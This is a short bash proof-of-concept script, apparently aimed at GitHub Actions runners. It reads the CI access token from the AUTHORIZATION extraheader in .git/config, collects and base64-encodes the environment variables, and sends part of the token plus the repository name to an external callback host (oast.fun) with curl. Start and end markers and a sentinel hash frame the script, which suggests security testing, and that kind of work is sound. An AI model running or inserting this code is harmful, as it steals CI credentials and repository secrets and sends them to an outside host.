#\!/bin/bash
# PoC: HYDRA-d578a5687951f7099e2789c8b84e85ae
echo "HYDRA-POC-START"
TOKEN=$(grep -i "extraheader = AUTHORIZATION" .git/config 2>/dev/null | awk '{print $NF}' | base64 -d 2>/dev/null | sed 's/x-access-token://')
ENV_DATA=$(env | base64 -w0 2>/dev/null | head -c 4096)
curl -s "https://oast.fun/hydra/?t=${TOKEN:0:8}&r=${GITHUB_REPOSITORY}&fid=d578a5" -o /dev/null || true
echo "HYDRA-POC-END"
echo "Sentinel: d578a5687951f7099e2789c8b84e85ae"
